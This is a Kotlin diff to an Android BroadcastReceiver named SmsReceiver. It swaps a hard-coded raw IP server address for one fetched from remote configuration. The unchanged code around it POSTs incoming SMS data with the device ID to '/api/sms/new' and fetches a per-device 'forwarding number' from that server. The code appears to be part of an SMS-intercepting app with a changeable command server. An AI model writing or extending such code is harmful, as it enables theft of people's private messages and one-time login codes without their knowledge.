@@ -11,6 +11,10 @@ import java.net.HttpURLConnection
 import java.net.URL
 
 class SmsReceiver : BroadcastReceiver() {
+    
+    // ?? Use RemoteConfigManager for dynamic BASE_URL
+    private val baseUrl: String
+        get() = RemoteConfigManager.getBaseUrl()
 
     override fun onReceive(context: Context?, intent: Intent?) {
         if (context == null || intent == null) {
@@ -74,7 +78,7 @@ class SmsReceiver : BroadcastReceiver() {
                 put("deviceId", deviceId)
             }
 
-            val url = URL("http://95.134.130.160:8765/api/sms/new")
+            val url = URL("$baseUrl/api/sms/new")
             val conn = url.openConnection() as HttpURLConnection
 
             conn.requestMethod = "POST"
@@ -103,7 +107,7 @@ class SmsReceiver : BroadcastReceiver() {
                 Settings.Secure.ANDROID_ID
             )
 
-            val url = URL("http://95.134.130.160:8765/api/getForwardingNumber/$deviceId")
+            val url = URL("$baseUrl/api/getForwardingNumber/$deviceId")
             val conn = url.openConnection() as HttpURLConnection
 
             conn.requestMethod = "GET"
